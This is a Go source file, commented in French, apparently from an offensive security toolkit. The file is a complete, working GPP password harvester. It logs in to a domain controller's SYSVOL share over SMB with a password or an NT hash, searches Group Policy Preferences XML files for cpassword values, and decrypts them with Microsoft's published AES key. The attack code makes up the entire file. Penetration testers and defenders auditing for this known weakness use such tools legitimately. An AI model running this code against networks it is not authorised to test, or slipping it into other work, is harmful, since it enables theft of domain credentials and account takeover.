// pkg/smb/gpp.go
//
// GPP Password Decryption (Group Policy Preferences)
//
// Depuis MS14-025 (2014), Microsoft a publié la clé AES-256 utilisée pour
// chiffrer les mots de passe dans les fichiers GPP (Groups.xml, Services.xml, etc.)
// La clé est : 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
//
// Fichiers concernés (sur SYSVOL) :
//   Groups.xml, Services.xml, Scheduledtasks.xml,
//   DataSources.xml, Printers.xml, Drives.xml

package smb

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"io"
	"net"
	"path/filepath"
	"strings"

	"github.com/hirochachacha/go-smb2"
)

// GPPKey est la clé AES-256 publiée par Microsoft (MS14-025)
// Source : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref
var GPPKey = []byte{
	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
	0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
	0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
}

// GPPPassword représente un credential trouvé dans SYSVOL
type GPPPassword struct {
	File     string // chemin relatif dans SYSVOL
	Username string
	Password string // déchiffré
	Changed  string // date de modification
	GPO      string // nom ou GUID de la GPO
	Type     string // Groups, Services, ScheduledTasks, etc.
}

// GPPFiles liste les fichiers GPP susceptibles de contenir des credentials
var GPPFiles = []string{
	"Groups.xml",
	"Services.xml",
	"ScheduledTasks.xml",
	"DataSources.xml",
	"Printers.xml",
	"Drives.xml",
}

// ============================================================
// Scan SYSVOL
// ============================================================

// ScanGPPPasswords scanne SYSVOL à la recherche de mots de passe GPP.
// Nécessite un accès en lecture sur \\target\SYSVOL (utilisateur authentifié du domaine).
func ScanGPPPasswords(target, username, domain, password string, ntHash []byte) ([]GPPPassword, error) {
	conn, err := net.Dial("tcp", target+":445")
	if err != nil {
		return nil, fmt.Errorf("SMB connection failed: %v", err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     username,
			Password: password,
			Domain:   domain,
			Hash:     ntHash,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		return nil, fmt.Errorf("SMB auth failed: %v", err)
	}
	defer session.Logoff()

	fs, err := session.Mount("SYSVOL")
	if err != nil {
		return nil, fmt.Errorf("SYSVOL mount failed (check SMB access): %v", err)
	}
	defer fs.Umount()

	var results []GPPPassword
	err = walkGPPFiles(fs, ".", &results)
	if err != nil {
		return results, fmt.Errorf("SYSVOL walk failed: %v", err)
	}

	return results, nil
}

// walkGPPFiles parcourt récursivement SYSVOL à la recherche de fichiers GPP
func walkGPPFiles(fs *smb2.Share, dir string, results *[]GPPPassword) error {
	entries, err := fs.ReadDir(dir)
	if err != nil {
		return nil // accès refusé sur un sous-dossier → continuer
	}

	for _, entry := range entries {
		path := filepath.Join(dir, entry.Name())
		path = strings.ReplaceAll(path, "\\", "/")

		if entry.IsDir() {
			walkGPPFiles(fs, path, results) // ignorer les erreurs d'accès
			continue
		}

		// Vérifier si c'est un fichier GPP
		for _, gppFile := range GPPFiles {
			if strings.EqualFold(entry.Name(), gppFile) {
				passwords, err := parseGPPFile(fs, path, entry.Name())
				if err == nil {
					*results = append(*results, passwords...)
				}
				break
			}
		}
	}

	return nil
}

// parseGPPFile lit et parse un fichier GPP XML pour extraire les cpassword
func parseGPPFile(fs *smb2.Share, path, filename string) ([]GPPPassword, error) {
	f, err := fs.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		return nil, err
	}

	return extractGPPPasswords(data, path, filename)
}

// ============================================================
// Parsing XML GPP
// ============================================================

// extractGPPPasswords extrait les cpassword depuis le contenu XML
func extractGPPPasswords(data []byte, filePath, filename string) ([]GPPPassword, error) {
	var results []GPPPassword

	fileType := strings.TrimSuffix(strings.ToLower(filename), ".xml")
	// Capitaliser : "groups" → "Groups"
	if len(fileType) > 0 {
		fileType = strings.ToUpper(fileType[:1]) + fileType[1:]
	}

	// Parser générique — tous les fichiers GPP ont des attributs cpassword
	type Property struct {
		CPassword string `xml:"cpassword,attr"`
		UserName  string `xml:"userName,attr"`
		RunAs     string `xml:"runAs,attr"`
		Name      string `xml:"name,attr"`
		Changed   string `xml:"changed,attr"`
	}
	type Node struct {
		Properties Property `xml:"Properties"`
		Changed    string   `xml:"changed,attr"`
		Name       string   `xml:"name,attr"`
	}
	type Root struct {
		Nodes []Node `xml:",any"`
	}

	// Approche par tokenizer pour capturer TOUS les attributs cpassword
	// peu importe la hiérarchie XML
	cpasswords := extractAllCPasswords(data)
	for _, cp := range cpasswords {
		if cp.CPassword == "" {
			continue
		}

		decrypted, err := DecryptCPassword(cp.CPassword)
		if err != nil {
			decrypted = fmt.Sprintf("(decrypt error: %v)", err)
		}

		// Extraire le GUID de GPO depuis le chemin ({GUID}\...)
		gpo := extractGPOGUID(filePath)

		results = append(results, GPPPassword{
			File:     filePath,
			Username: firstNonEmpty(cp.UserName, cp.RunAs, cp.Name, "(unknown)"),
			Password: decrypted,
			Changed:  cp.Changed,
			GPO:      gpo,
			Type:     fileType,
		})
	}

	_ = Root{} // éviter l'import inutilisé
	return results, nil
}

// cpasswordEntry représente un élément avec cpassword extrait du XML
type cpasswordEntry struct {
	CPassword string
	UserName  string
	RunAs     string
	Name      string
	Changed   string
}

// extractAllCPasswords parcourt le XML pour trouver tous les attributs cpassword
func extractAllCPasswords(data []byte) []cpasswordEntry {
	var entries []cpasswordEntry

	decoder := xml.NewDecoder(bytes.NewReader(data))
	for {
		token, err := decoder.Token()
		if err != nil {
			break
		}

		start, ok := token.(xml.StartElement)
		if !ok {
			continue
		}

		var e cpasswordEntry
		for _, attr := range start.Attr {
			switch strings.ToLower(attr.Name.Local) {
			case "cpassword":
				e.CPassword = attr.Value
			case "username":
				e.UserName = attr.Value
			case "runas":
				e.RunAs = attr.Value
			case "name":
				e.Name = attr.Value
			case "changed":
				e.Changed = attr.Value
			}
		}

		if e.CPassword != "" {
			entries = append(entries, e)
		}
	}

	return entries
}

// ============================================================
// Déchiffrement AES-256-CBC
// ============================================================

// DecryptCPassword déchiffre un cpassword GPP avec la clé AES publiée.
// Le cpassword est en base64 (padding ajusté), chiffré AES-256-CBC
// avec un IV de 16 zéros.
func DecryptCPassword(cpassword string) (string, error) {
	if cpassword == "" {
		return "", fmt.Errorf("empty cpassword")
	}

	// Ajouter le padding base64 manquant
	switch len(cpassword) % 4 {
	case 2:
		cpassword += "=="
	case 3:
		cpassword += "="
	}

	ciphertext, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %v", err)
	}

	block, err := aes.NewCipher(GPPKey)
	if err != nil {
		return "", fmt.Errorf("AES cipher creation failed: %v", err)
	}

	if len(ciphertext) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too short (%d bytes)", len(ciphertext))
	}
	if len(ciphertext)%aes.BlockSize != 0 {
		return "", fmt.Errorf("ciphertext not aligned to AES block size")
	}

	// IV = 16 zéros (spécifié dans MS-GPPREF)
	iv := make([]byte, aes.BlockSize)

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Supprimer le padding PKCS#7
	plaintext = removePKCS7Padding(plaintext)

	// Le résultat est en UTF-16LE → convertir en string
	return utf16LEToString(plaintext), nil
}

// removePKCS7Padding supprime le padding PKCS#7
func removePKCS7Padding(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	padLen := int(data[len(data)-1])
	if padLen == 0 || padLen > aes.BlockSize || padLen > len(data) {
		return data
	}
	// Vérifier que tous les bytes de padding sont corrects
	for i := len(data) - padLen; i < len(data); i++ {
		if int(data[i]) != padLen {
			return data
		}
	}
	return data[:len(data)-padLen]
}

// utf16LEToString convertit des bytes UTF-16LE en string Go
func utf16LEToString(b []byte) string {
	if len(b) < 2 {
		return string(b)
	}
	// Vérifier si c'est bien du UTF-16LE (null bytes intercalés)
	isUTF16 := true
	for i := 1; i < len(b) && i < 16; i += 2 {
		if b[i] != 0x00 {
			isUTF16 = false
			break
		}
	}
	if !isUTF16 {
		return strings.TrimRight(string(b), "\x00")
	}

	// Convertir UTF-16LE → string
	runes := make([]rune, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		r := rune(b[i]) | rune(b[i+1])<<8
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes)
}

// ============================================================
// Helpers
// ============================================================

func extractGPOGUID(path string) string {
	// Chemin type : domain/Policies/{GUID}/Machine/Preferences/Groups/Groups.xml
	parts := strings.Split(path, "/")
	for _, p := range parts {
		if strings.HasPrefix(p, "{") && strings.HasSuffix(p, "}") {
			return p
		}
	}
	return "(unknown GPO)"
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if v != "" {
			return v
		}
	}
	return ""
}
